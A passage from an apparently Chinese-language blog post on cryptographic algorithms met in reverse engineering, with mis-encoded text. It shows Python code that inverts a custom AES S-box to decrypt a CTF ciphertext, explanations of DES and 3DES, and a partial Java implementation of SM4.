class="hljs-number">0xAB</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCB</span>,<br>             <span class="hljs-number">0x53</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x78</span>,<br>             <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x5B</span>,<br>             <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA5</span>,<br>             <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC0</span>,<br>             <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x87</span>,<br>             <span class="hljs-number">0x94</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xCC</span>,<br>             <span class="hljs-number">0x86</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x90</span>,<br>             <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x64</span>,<br>             <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xB6</span>,<br>             <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xE5</span>,<br>             <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xF0</span>,<br>             <span class="hljs-number">0x32</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xA8</span>,<br>             <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1C</span>,<br>             <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFD</span>]<br><br>new_contrary_sbox = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    line = (new_s_box[i] &amp; <span class="hljs-number">0xf0</span>) &gt;&gt; <span class="hljs-number">4</span><br><br>    rol = new_s_box[i] &amp; <span class="hljs-number">0xf</span><br><br>    new_contrary_sbox[(line * <span class="hljs-number">16</span>) + rol] = i<br><br><span class="hljs-built_in">print</span>(new_contrary_sbox)<br>IInput = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;B0CC93EAE92FEF5699396E023B4F9E42&#x27;</span>)<br><span class="hljs-built_in">print</span>(IInput)<br>Cipher_Key = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">b&#x27;user01_nkctf2024&#x27;</span>)<br><span class="hljs-built_in">print</span>(Cipher_Key)<br>Out = IAES().IAES(IInput, Cipher_Key,new_contrary_sbox)<br><span class="hljs-built_in">print</span>(Out)<br></code></pre></td></tr></table></figure><h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><p>å¯¹ç§°å¯†ç ï¼ŒDESä½¿ç”¨64ä½çš„å¯†é’¥å’Œ64ä½çš„æ˜æ–‡å—è¿›è¡ŒåŠ å¯†ã€‚DESç®—æ³•çš„åˆ†ç»„å¤§å°æ˜¯64ä½ï¼Œå› æ­¤ï¼Œå¦‚æœéœ€è¦åŠ å¯†çš„æ˜æ–‡é•¿åº¦ä¸è¶³64ä½ï¼Œéœ€è¦è¿›è¡Œå¡«å……ï¼›å¦‚æœæ˜æ–‡é•¿åº¦è¶…è¿‡64ä½ï¼Œåˆ™éœ€è¦ä½¿ç”¨åˆ†ç»„æ¨¡å¼è¿›è¡Œåˆ†ç»„åŠ å¯†</p><p><strong>è¯†åˆ«ä¸»è¦é å¸¸é‡</strong></p><h2 id="åˆå§‹ç½®æ¢-IPç½®æ¢"><a href="#åˆå§‹ç½®æ¢-IPç½®æ¢" class="headerlink" title="åˆå§‹ç½®æ¢(IPç½®æ¢)"></a>åˆå§‹ç½®æ¢(IPç½®æ¢)</h2><p>å°†è¾“å…¥çš„64ä½æ˜æ–‡å—è¿›è¡Œç½®æ¢å’Œé‡æ–°æ’åˆ—ï¼Œç”Ÿæˆæ–°çš„64ä½æ•°æ®å—</p><p>ç›®çš„:å¢åŠ åŠ å¯†çš„æ··ä¹±ç¨‹åº¦ï¼Œä½¿æ˜æ–‡ä¸­çš„æ¯ä¸€ä½éƒ½èƒ½å¤Ÿå¯¹åé¢çš„åŠ å¯†è¿‡ç¨‹äº§ç”Ÿå½±å“ï¼Œæé«˜åŠ å¯†å¼ºåº¦</p><p>æˆ‘ä»¬å°†æŠŠ64ä½çš„é¡ºåºæŒ‰ä¸‹è¡¨ä¸­è§„å®šçš„é¡ºåºæ”¾ç½®ï¼Œå›¾ä¸­çš„æ•°å­—æ˜¯åœ¨64ä½æ˜æ–‡ä¸­æ¯ä¸ªæ¯”ç‰¹çš„ç´¢å¼•ä½ç½®</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694071400888-30529eea-1dbf-4aed-99b6-19d64f855758.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1727531578705-8594fe2a-08e7-46a4-a7b6-e356c9a8929c.png" class="" title="img"><h2 id="åŠ å¯†è½®æ¬¡"><a href="#åŠ å¯†è½®æ¬¡" class="headerlink" title="åŠ å¯†è½®æ¬¡"></a>åŠ å¯†è½®æ¬¡</h2><p>åˆå§‹ç½®æ¢å®Œæˆåï¼Œæ˜æ–‡è¢«åˆ’åˆ†æˆäº†ç›¸åŒé•¿åº¦ï¼ˆ32ä½ï¼‰çš„å·¦å³ä¸¤éƒ¨åˆ†ï¼Œè®°ä½œL0,R0ã€‚æ¥ä¸‹æ¥å°±ä¼šè¿›è¡Œ16ä¸ªè½®æ¬¡çš„åŠ å¯†</p><p>ä»å•ç‹¬ä¸€ä¸ªè½®æ¬¡æ¥çœ‹ï¼Œé¦–å…ˆæŠŠç›®å…‰èšç„¦åœ¨R0è¿™é‡Œã€‚å³åŠéƒ¨åˆ†R0ä¼šä½œä¸ºä¸‹ä¸€è½®æ¬¡çš„å·¦åŠéƒ¨åˆ†L1çš„è¾“å…¥ã€‚å…¶æ¬¡ï¼ŒR0ä¼šè¡¥ä½åˆ°48ä½å’Œæœ¬è½®æ¬¡ç”Ÿæˆçš„48ä½K0è¾“å…¥åˆ°Fè½®å‡½æ•°ä¸­å»ã€‚Få‡½æ•°çš„è¾“å‡ºç»“æœä¸º32ä½ï¼Œç»“æœF(R0,K0)ä¼šå’ŒL0è¿›è¡Œå¼‚æˆ–è¿ç®—ä½œä¸ºä¸‹ä¸€è½®æ¬¡å³åŠéƒ¨åˆ†R1çš„è¾“å…¥</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694071541210-ea7a4a4d-ec16-4ba0-9181-4e2d4759b699.png" class="" title="img"><p>ä»¥æ­¤ç±»æ¨ï¼Œé‡å¤16è½®è¿ç®—</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694071672214-90ee84c9-fa8b-40b7-8f20-cfbbbfb680a5.png" class="" title="img"><h3 id="æ‹“å±•Råˆ°48ä½"><a href="#æ‹“å±•Råˆ°48ä½" class="headerlink" title="æ‹“å±•Råˆ°48ä½"></a>æ‹“å±•Råˆ°48ä½</h3><p>å°†32ä½çš„R0å³åŠéƒ¨åˆ†è¿›è¡Œæ‰©å±•ï¼Œå¾—åˆ°ä¸€ä¸ª48ä½çš„æ•°æ®å—ã€‚åŒæ ·çš„ï¼Œæ•°æ®æ‹“å±•ä¹Ÿæ˜¯æ ¹æ®ä¸€ä¸ªå›ºå®šçš„ç½®æ¢è¡¨ã€‚çº¢æ¡†ä¸­å°±æ˜¯æˆ‘ä»¬è¦è¡¥ä½çš„æ•°æ®</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694071810598-38955c99-d8a5-4220-bf79-8d787629cae6.png" class="" title="img"><p>ç”±æ­¤å¯è§ï¼Œæ‰©å±•è¿‡ç¨‹çš„æ¯ä¸€ä½éƒ½æ˜¯æ ¹æ®ä¸Šè¿°çš„ç½®æ¢è¡¨ä»è¾“å…¥çš„32ä½æ•°æ®å—ä¸­æå–å‡ºæ¥çš„ã€‚åŸå§‹æ•°æ®çš„ç¬¬32ä½è¢«è¡¥å……åˆ°äº†æ–°å¢åˆ—çš„ç¬¬ä¸€ä¸ªï¼Œç¬¬5ä½è¢«è¡¥å……åˆ°äº†ç¬¬äºŒä¸ªæ–°å¢åˆ—çš„ç¬¬ä¸€ä¸ªï¼Œä»¥æ­¤ç±»æ¨</p><h3 id="å­å¯†é’¥kçš„ç”Ÿæˆ"><a href="#å­å¯†é’¥kçš„ç”Ÿæˆ" class="headerlink" title="å­å¯†é’¥kçš„ç”Ÿæˆ"></a>å­å¯†é’¥kçš„ç”Ÿæˆ</h3><p>DESç®—æ³•é‡‡ç”¨äº†æ¯è½®å­å¯†é’¥ç”Ÿæˆçš„æ–¹å¼æ¥å¢åŠ å¯†é’¥çš„å¤æ‚æ€§å’Œå®‰å…¨æ€§ã€‚æ¯è½®å­å¯†é’¥éƒ½æ˜¯ç”±ä¸»å¯†é’¥ï¼ˆ64ä½ï¼‰é€šè¿‡å¯†é’¥è°ƒåº¦ç®—æ³•ï¼ˆKey Schedule Algorithmï¼‰ç”Ÿæˆçš„ã€‚DESç®—æ³•çš„å¯†é’¥è°ƒåº¦ç®—æ³•å¯ä»¥å°†64ä½çš„ä¸»å¯†é’¥åˆ†æˆ16ä¸ªå­å¯†é’¥ï¼Œæ¯ä¸ªå­å¯†é’¥48ä½ï¼Œç”¨äºæ¯è½®åŠ å¯†ä¸­ä¸è¾“å…¥æ•°æ®è¿›è¡Œå¼‚æˆ–è¿ç®—</p><p>é€šè¿‡å­å¯†é’¥ç”Ÿæˆçš„æµç¨‹å›¾æ¥çœ‹ä¸‹æ•´ä¸ªè¿‡ç¨‹</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694071939493-34bc8cab-2bd7-499c-9561-b8d15aaeee79.png" class="" title="img"><p>ä¸»å¯†é’¥ï¼Œä¸‹é¢56ä½æ˜¯å·²ç»åˆ é™¤ä»¥8ä¸ºå€æ•°çš„å¥‡å¶æ ¡éªŒä½</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694079312722-d977fff3-3ac0-4f72-bbbe-ed5fa934945b.png" class="" title="img"><h3 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h3><p>å½“å‰è½®æ¬¡çš„å­å¯†é’¥Kiï¼ˆåœ¨ä¸Šé¢56ä½çš„åŸºç¡€ä¸Šåˆ é™¤ç‰¹å®šçš„8ä½ï¼Œå¾—åˆ°48ä½ï¼‰ä¸æ‹“å±•çš„48ä½Riè¿›è¡Œå¼‚æˆ–è¿ç®—ã€‚è¿ç®—ç»“æœä¼šä½œä¸ºæ¥ä¸‹æ¥Sç›’æ›¿æ¢çš„è¾“å…¥</p><h3 id="Sç›’æ›¿æ¢"><a href="#Sç›’æ›¿æ¢" class="headerlink" title="Sç›’æ›¿æ¢"></a>Sç›’æ›¿æ¢</h3><p>ç”¨äºå°†ä¸Šä¸€è½®å¼‚æˆ–è¿ç®—çš„48ä½ç»“æœæ˜ å°„åˆ°32ä½è¾“å‡ºä¸­å»</p><p>6ä½å˜4ä½ï¼Œé¦–å°¾ä¸¤ä½ä½œä¸ºè¡Œæ ‡ï¼Œä¸­é—´å››ä½ä½œä¸ºåˆ—æ ‡ï¼Œå»ä¸åŒçš„Sç›’å¯¹åº”ä¸€ä¸ªå°äº16çš„æ•°ï¼Œå†è½¬åŒ–ä¸º4ä½äºŒè¿›åˆ¶æ•°</p><h3 id="Pç›’ä»£æ¢"><a href="#Pç›’ä»£æ¢" class="headerlink" title="Pç›’ä»£æ¢"></a>Pç›’ä»£æ¢</h3><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694072162715-e2efba05-73c8-471a-96b2-35f24616460c.png" class="" title="img"><p>Pç›’ä»£æ¢å°†Sç›’æ›¿æ¢çš„32ä½è¾“å‡ºä½œä¸ºè¾“å…¥ï¼Œç»è¿‡ä¸Šè¿°å›ºå®šçš„ä»£æ¢è¡¨è¿›è¡Œä»£æ¢åå³ä¸ºæœ€åFè½®å‡½æ•°çš„ç»“æœ</p><h2 id="é€†ç½®æ¢"><a href="#é€†ç½®æ¢" class="headerlink" title="é€†ç½®æ¢"></a>é€†ç½®æ¢</h2><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694072214847-8f04ca31-871f-49b7-b019-c02f3d928acd.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694078794302-44b2c0af-77ce-4b5e-8ac4-ab7cbe969fde.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694078824080-db4d1e9d-a053-45a6-bab4-85da101f2769.png" class="" title="img"><h2 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h2><p>3DESé¡¾åæ€ä¹‰ï¼Œå°±iæ˜¯ä½¿ç”¨DESåŠ å¯†3æ¬¡ï¼Œä½¿ç”¨3ä¸ªå¯†é’¥è¿›è¡ŒåŠ è§£å¯†</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694072338044-c6e05c74-0d2e-476d-8de2-d0bb36fe6169.png" class="" title="img"><h1 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h1><p>å¸¸æ•°<code>0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc</code></p><p>åˆ†ç»„å¯†ç ï¼Œåˆ†ç»„é•¿åº¦128ä½ï¼Œå¯†é’¥é•¿åº¦128ä½ï¼Œ32è½®è¿­ä»£å’Œä¸€æ¬¡ååºå˜æ¢ï¼Œè¾“å…¥4å­—ï¼ˆ16å­—èŠ‚ï¼Œæ¢ç®—æ–¹æ³•æ˜¯å¯†ç ç®—æ³•ç‰¹æœ‰çš„ï¼‰</p><p>åˆ†ä¸ºå¯†é’¥æ‹“å±•å’ŒåŠ &#x2F;è§£å¯†ä¸¤ä¸ªæ¨¡å—ï¼Œä¸‹å›¾æ˜¯ SM4 çš„åŠ è§£å¯†ï¼ˆå·¦ï¼‰å’Œå¯†é’¥æ‹“å±•ï¼ˆå³ï¼‰çš„æµç¨‹å›¾</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1707701871151-2c6db9da-3ca6-4ad3-b3cc-538572671725.png" class="" title="img"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SM4</span> &#123;<br>    <span class="hljs-type">int</span>[] key_r;<br><br>    <span class="hljs-comment">/* åˆå§‹åŒ–è½®å¯†é’¥ */</span><br>    SM4(<span class="hljs-type">byte</span>[] key) &#123;<br>        <span class="hljs-built_in">this</span>.key_r = keyGenerate(key);<br>    &#125;<br><br>    <span class="hljs-comment">/* å¯†é’¥æ‹“å±• */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[] keyGenerate(<span class="hljs-type">byte</span>[] key) &#123;<br>        <span class="hljs-type">int</span>[] key_r = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">32</span>];<span class="hljs-comment">//è½®å¯†é’¥rk_i</span><br>        <span class="hljs-type">int</span>[] key_temp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span> box_in, box_out;<span class="hljs-comment">//ç›’å˜æ¢è¾“å…¥è¾“å‡º</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] FK = &#123;<span class="hljs-number">0xa3b1bac6</span>, <span class="hljs-number">0x56aa3350</span>, <span class="hljs-number">0x677d9197</span>, <span class="hljs-number">0xb27022dc</span>&#125;;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] CK = &#123;<br>                <span class="hljs-number">0x00070e15</span>, <span class="hljs-number">0x1c232a31</span>, <span class="hljs-number">0x383f464d</span>, <span class="hljs-number">0x545b6269</span>,<br>                <span class="hljs-number">0x70777e85</span>, <span class="hljs-number">0x8c939aa1</span>, <span class="hljs-number">0xa8afb6bd</span>, <span class="hljs-number">0xc4cbd2d9</span>,<br>                <span class="hljs-number">0xe0e7eef5</span>, <span class="hljs-number">0xfc030a11</span>, <span class="hljs-number">0x181f262d</span>, <span class="hljs-number">0x343b4249</span>,<br>                <span class="hljs-number">0x50575e65</span>, <span class="hljs-number">0x6c737a81</span>, <span class="hljs-number">0x888f969d</span>, <span class="hljs-number">0xa4abb2b9</span>,<br>                <span class="hljs-number">0xc0c7ced5</span>, <span class="hljs-number">0xdce3eaf1</span>, <span class="hljs-number">0xf8ff060d</span>, <span class="hljs-number">0x141b2229</span>,<br>                <span class="hljs-number">0x30373e45</span>, <span class="hljs-number">0x4c535a61</span>, <span class="hljs-number">0x686f767d</span>, <span class="hljs-number">0x848b9299</span>,<br>                <span class="hljs-number">0xa0a7aeb5</span>, <span class="hljs-number">0xbcc3cad1</span>, <span class="hljs-number">0xd8dfe6ed</span>, <span class="hljs-number">0xf4fb0209</span>,<br>                <span class="hljs-number">0x10171e25</span>, <span class="hljs-number">0x2c333a41</span>, <span class="hljs-number">0x484f565d</span>, <span class="hljs-number">0x646b7279</span><br>        &#125;;<br>        <span class="hljs-comment">//å°†è¾“å…¥çš„å¯†é’¥æ¯32æ¯”ç‰¹åˆå¹¶ï¼Œå¹¶å¼‚æˆ–FK</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            key_temp[i] = jointBytes(key[<span class="hljs-number">4</span> * i], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]);<br>            key_temp[i] = key_temp[i] ^ FK[i];<br>        &#125;<br>        <span class="hljs-comment">//32è½®å¯†é’¥æ‹“å±•</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>            box_in = key_temp[<span class="hljs-number">1</span>] ^ key_temp[<span class="hljs-number">2</span>] ^ key_temp[<span class="hljs-number">3</span>] ^ CK[i];<br>            box_out = sBox(box_in);<br>            key_r[i] = key_temp[<span class="hljs-number">0</span>] ^ box_out ^ shift(box_out, <span class="hljs-number">13</span>) ^ shift(box_out, <span class="hljs-number">23</span>);<br>            key_temp[<span class="hljs-number">0</span>] = key_temp[<span class="hljs-number">1</span>];<br>            key_temp[<span class="hljs-number">1</span>] = key_temp[<span class="hljs-number">2</span>];<br>            key_temp[<span class="hljs-number">2</span>] = key_temp[<span class="hljs-number">3</span>];<br>            key_temp[<span class="hljs-number">3</span>] = key_r[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> key_r;<br>    &#125;<br><br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] sm4Main(<span class="hljs-type">byte</span>[] input, <span class="hljs-type">int</span>[] key_r, <span class="hljs-type">int</span> mod) &#123;<br>        <span class="hljs-type">int</span>[] text = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<span class="hljs-comment">//32æ¯”ç‰¹å­—</span><br>        <span 